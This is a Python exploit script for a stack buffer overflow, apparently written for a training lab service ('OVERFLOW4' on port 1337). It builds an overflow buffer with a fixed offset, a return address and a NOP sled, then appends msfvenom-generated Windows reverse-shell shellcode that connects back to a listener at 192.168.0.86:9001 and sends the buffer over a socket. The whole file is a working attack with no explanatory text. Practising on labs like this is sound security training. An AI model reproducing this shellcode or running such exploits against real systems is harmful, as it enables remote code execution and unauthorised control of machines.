#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 16

# Badchars: \x00\xa9\xcd\xd4
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c
payload = (
"\xdd\xc7\xb8\x94\x57\x15\xa4\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xd1\x44\xf7\x51\x25"
"\x82\x75\x99\xd5\x53\x1a\x13\x30\x62\x1a\x47\x31\xd5\xaa"
"\x03\x17\xda\x41\x41\x83\x69\x27\x4e\xa4\xda\x82\xa8\x8b"
"\xdb\xbf\x89\x8a\x5f\xc2\xdd\x6c\x61\x0d\x10\x6d\xa6\x70"
"\xd9\x3f\x7f\xfe\x4c\xaf\xf4\x4a\x4d\x44\x46\x5a\xd5\xb9"
"\x1f\x5d\xf4\x6c\x2b\x04\xd6\x8f\xf8\x3c\x5f\x97\x1d\x78"
"\x29\x2c\xd5\xf6\xa8\xe4\x27\xf6\x07\xc9\x87\x05\x59\x0e"
"\x2f\xf6\x2c\x66\x53\x8b\x36\xbd\x29\x57\xb2\x25\x89\x1c"
"\x64\x81\x2b\xf0\xf3\x42\x27\xbd\x70\x0c\x24\x40\x54\x27"
"\x50\xc9\x5b\xe7\xd0\x89\x7f\x23\xb8\x4a\xe1\x72\x64\x3c"
"\x1e\x64\xc7\xe1\xba\xef\xea\xf6\xb6\xb2\x62\x3a\xfb\x4c"
"\x73\x54\x8c\x3f\x41\xfb\x26\xd7\xe9\x74\xe1\x20\x0d\xaf"
"\x55\xbe\xf0\x50\xa6\x97\x36\x04\xf6\x8f\x9f\x25\x9d\x4f"
"\x1f\xf0\x32\x1f\x8f\xab\xf2\xcf\x6f\x1c\x9b\x05\x60\x43"
"\xbb\x26\xaa\xec\x56\xdd\x3d\xd3\x0f\xdd\xeb\xbb\x4d\xdd"
"\x30\x15\xdb\x3b\x5c\x75\x8d\x94\xc9\xec\x94\x6e\x6b\xf0"
"\x02\x0b\xab\x7a\xa1\xec\x62\x8b\xcc\xfe\x13\x7b\x9b\x5c"
"\xb5\x84\x31\xc8\x59\x16\xde\x08\x17\x0b\x49\x5f\x70\xfd"
"\x80\x35\x6c\xa4\x3a\x2b\x6d\x30\x04\xef\xaa\x81\x8b\xee"
"\x3f\xbd\xaf\xe0\xf9\x3e\xf4\x54\x56\x69\xa2\x02\x10\xc3"
"\x04\xfc\xca\xb8\xce\x68\x8a\xf2\xd0\xee\x93\xde\xa6\x0e"
"\x25\xb7\xfe\x31\x8a\x5f\xf7\x4a\xf6\xff\xf8\x81\xb2\xe0"
"\x1a\x03\xcf\x88\x82\xc6\x72\xd5\x34\x3d\xb0\xe0\xb6\xb7"
"\x49\x17\xa6\xb2\x4c\x53\x60\x2f\x3d\xcc\x05\x4f\x92\xed"
"\x0f"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")